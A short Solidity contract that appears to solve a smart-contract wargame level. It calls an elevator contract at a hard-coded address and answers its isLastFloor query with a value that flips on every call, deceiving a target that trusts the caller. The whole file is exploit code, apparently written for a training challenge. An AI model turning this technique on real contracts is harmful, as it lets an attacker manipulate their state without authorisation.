//SDPX-License-Identifier: MIT

pragma solidity 0.6.0;

interface Building {
  function isLastFloor(uint256) external returns (bool);
}

contract Elevate is Building {
  address elevator = 0x50C2c519d15D41fdCdA62568A8D33fc055FED7E7;
  bool top = true;

  function elevate(uint256 _floor) public returns (bool success) {
    (success, ) = elevator.call(
      abi.encodeWithSignature("goTo(uint256)", _floor)
    );
    require(success, "Could not elevate");
  }

  function isLastFloor(uint256) external override returns (bool) {
    top = !top;
    return top;
  }
}